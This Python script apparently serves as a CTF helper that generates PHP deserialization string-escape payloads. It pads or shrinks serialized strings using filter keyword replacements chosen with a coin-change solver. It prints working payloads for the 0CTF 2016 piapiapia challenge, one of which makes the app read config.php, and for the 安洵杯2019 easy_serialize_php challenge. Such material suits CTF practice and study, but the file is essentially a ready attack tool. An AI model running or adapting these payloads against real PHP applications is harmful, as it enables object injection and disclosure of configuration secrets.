from 最小钱币 import *
def get_escape_vars(search,escape_str,*replace_list):
    replace_len_dict=dict()
    str1=len(search)
    for i in replace_list:
        if abs(len(i)-str1) not in replace_len_dict.values():#如果过滤器中有字符串长度相等的字符，则直接忽略，最终结果中不予体现。
            replace_len_dict[i]=abs(len(i)-str1)
    long=len(escape_str)
    return str1,long,replace_len_dict

def main(search,escape_str,*replace_list):
    search1, escape_str1, replace_dict = get_escape_vars(search, escape_str, *replace_list)
    #print(replace_dict)

    method = mincoin(int(escape_str1), *list(replace_dict.values()))
    #print(method)

    payload = ''
    for i in method:
        for k in i:
            for j in replace_dict:
                if replace_dict[j] == k:
                    payload += j
        print(payload+escape_str)
        payload = ''


#增逃逸【0CTF 2016】piapiapia
print("\n增逃逸【0CTF 2016】piapiapia")
search='hacker'
filter_list=['select','insert','update','delete','where']
escape_str='";}s:5:"photo";s:10:"config.php";}'
main(search,escape_str,*filter_list)
#减逃逸【安洵杯2019】easy_serialize_php
print("\n减逃逸【安洵杯2019】easy_serialize_php")
search=''
filter_list=['php','flag','php5','php4','fl1g']
escape_str='";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";s:7:"fuction";s:68:"guest'
main(search,escape_str,*filter_list)
